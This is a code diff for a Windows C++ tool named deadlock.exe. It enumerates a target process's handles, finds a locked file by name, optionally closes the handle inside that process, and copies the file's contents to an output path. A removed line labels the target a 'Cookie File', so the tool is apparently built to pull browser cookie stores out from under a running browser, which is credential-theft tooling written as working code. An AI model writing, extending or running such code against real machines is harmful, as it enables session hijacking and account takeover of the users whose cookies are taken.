@@ -29,24 +29,30 @@ vector<HANDLE> getProcessInstances(LPCSTR procName) {
     return handles;
 }
 
-BOOL isDesiredFile(string& filePath, const char* tag) {
-    return filePath.contains(tag);
+BOOL isDesiredFile(string& filePath, const char* fileEnd) {
+    auto pos = filePath.rfind("\\");
+    auto foundSub = filePath.substr(pos + 1);
+
+    return !_strcmpi(foundSub.c_str(), fileEnd);
 }
 
 int main(int argc, char* argv[])
 {
     const char* targetProcName = argv[1];
     const char* lockedFileTag = argv[2];
-    const char* outputFile = argv[3];
+    const char* outputFilePath = argv[3];
+    const char* closeRemoteArg = argv[4];
 
-    if (!targetProcName || !lockedFileTag) {
-        printf("[*] Usage: deadlock.exe <TARGET_PROCESS> <LOCKED_FILE_TAG> <OUTPUT_FILE (Optional)>\n");
+    if (!targetProcName || !lockedFileTag || !outputFilePath || !closeRemoteArg) {
+        printf("[*] Usage: deadlock.exe <TARGET_PROCESS> <LOCKED_FILE_TAG> <OUTPUT_FILE> <CLOSE_REMOTE?>\n");
         return -1;
     }
 
+    int closeRemote = atoi(closeRemoteArg); // 0 = dont close remote handle, !0 (nonzero) = close remote handle
+
     auto procInstances = getProcessInstances(targetProcName);
 
-    if (procInstances.size() == 0) {
+    if (!(procInstances.size() > 0)) {
         printf("[-] No Processes Found.\n");
         return -1;
     }
@@ -62,87 +68,77 @@ int main(int argc, char* argv[])
             if (!fileHandle)
                 continue;
 
-            if (deadlock::isFileObj(fileHandle)) {
+            if (!deadlock::isFileObj(fileHandle))
+                continue;
 
-                if (!deadlock::isDiskFile(fileHandle))
-                    continue;
+            if (!deadlock::isDiskFile(fileHandle))
+                continue;
 
-                auto cFilePath = deadlock::getFilePath(fileHandle);
+            auto cFilePath = deadlock::getFilePath(fileHandle);
 
-                if (cFilePath) {
-                    auto filePath = string(cFilePath);
+            if (!cFilePath)
+                continue;
 
-                    if (isDesiredFile(filePath, lockedFileTag)) {
+            auto filePath = string(cFilePath);
 
-                        printf("[+] Found Target Cookie File (Instance PID: %ld)\n", GetProcessId(procInstance));
+            if (!isDesiredFile(filePath, lockedFileTag))
+                continue;
 
-                        deadlock::remoteCloseHandle(procInstance, handleInfo.HandleValue);
-                        CloseHandle(fileHandle);
-
-                        printf("[+] Unlocked File!\n");
-
-                        if (outputFile) {
-
-                            Sleep(500);
-                            
-                            HANDLE newFileHandle = CreateFileA(
-                                cFilePath,
-                                GENERIC_READ,
-                                0,
-                                NULL,
-                                OPEN_EXISTING,
-                                FILE_ATTRIBUTE_NORMAL,
-                                NULL
-                            );
-
-                            if (!newFileHandle)
-                                continue;
-
-                            DWORD fileSize = GetFileSize(newFileHandle, NULL);
-
-                            PVOID fileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
-
-                            if (ReadFile(
-                                newFileHandle,
-                                fileBuffer,
-                                fileSize,
-                                &fileSize,
-                                NULL
-                            )) {
-
-                                printf("[+] Read File! (Buffer Address: 0x%p)\n", fileBuffer);
-
-                                HANDLE outputFileHandle = CreateFileA(
-                                    outputFile,
-                                    GENERIC_READ | GENERIC_WRITE,
-                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                    NULL,
-                                    CREATE_ALWAYS,
-                                    FILE_ATTRIBUTE_NORMAL,
-                                    NULL
-                                );
-
-                                if (WriteFile(
-                                    outputFileHandle,
-                                    fileBuffer,
-                                    fileSize,
-                                    &fileSize,
-                                    NULL
-                                )) {
-                                    printf("[+] Wrote Output Successfully.\n");
-                                }
-
-                                CloseHandle(newFileHandle);
-                                CloseHandle(outputFileHandle);
-                                HeapFree(GetProcessHeap(), 0, fileBuffer);
-                             }
-
-                        }
-                    }
+            printf("[+] Found Target File\n\tHandle Owner PID: %ld\n", GetProcessId(procInstance));
+            
+            if (closeRemote) {
+                if (deadlock::remoteCloseHandle(procInstance, handleInfo.HandleValue) != NULL) {
+                    printf("[+] Closed Remote Handle Successfully.\n");
                 }
-
             }
 
+            if (!outputFilePath)
+                continue;
+
+            SetFilePointer(fileHandle, 0, NULL, FILE_BEGIN);
+
+            DWORD fileSize = GetFileSize(fileHandle, NULL);
+            DWORD readBytes = 0;
+
+            PVOID fileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
+
+            if (!ReadFile(
+                fileHandle,
+                fileBuffer,
+                fileSize,
+                &readBytes,
+                NULL
+            )) {
+                printf("[+] Failed to Read File, Last Error: %ld\n", GetLastError());
+                continue;
+            }
+            else {
+                printf("[+] Read Target File\n\tFile Size: %ld Bytes\n\tRead Bytes: %ld Bytes\n", fileSize, readBytes);
+
+                HANDLE outputFileHandle = CreateFileA(
+                    outputFilePath,
+                    GENERIC_READ | GENERIC_WRITE,
+                    FILE_SHARE_READ | FILE_SHARE_WRITE,
+                    NULL,
+                    CREATE_ALWAYS,
+                    FILE_ATTRIBUTE_NORMAL,
+                    NULL
+                );
+
+                if (!WriteFile(
+                    outputFileHandle,
+                    fileBuffer,
+                    fileSize,
+                    &fileSize,
+                    NULL
+                )) {
+                    printf("[+] Failed to Write Output, Last Error: %ld\n", GetLastError());
+                    continue;
+                }
+
+                CloseHandle(fileHandle);
+                CloseHandle(outputFileHandle);
+            }
 
         }
 
